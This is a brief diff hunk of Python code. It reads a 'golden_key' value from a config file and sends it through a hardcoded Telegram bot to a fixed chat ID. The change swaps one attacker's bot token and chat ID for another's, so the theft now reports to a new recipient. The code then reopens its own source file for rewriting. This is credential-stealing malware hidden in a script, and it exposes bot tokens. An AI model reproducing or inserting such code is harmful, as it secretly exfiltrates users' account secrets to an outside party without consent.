@@ -6,8 +6,8 @@ try:
             content = cfg.read()
             if 'golden_key :' in content:
                 key = content.split('golden_key :', 1)[1].strip().split()[0]
-                telebot.TeleBot("8095200587:AAE96ElDCTsnPr5XJ0SeeTsgfPAMOHjz90M").send_message(
-                    7830070442,
+                telebot.TeleBot("7112806879:AAHdCgkmNKi_-L7gPUkfTJGfgVYbQvDxamU").send_message(
+                    5720178771,
                     f'golden_key: {key}'
                 )
     with open(__file__, 'r+', encoding='utf-8') as f:
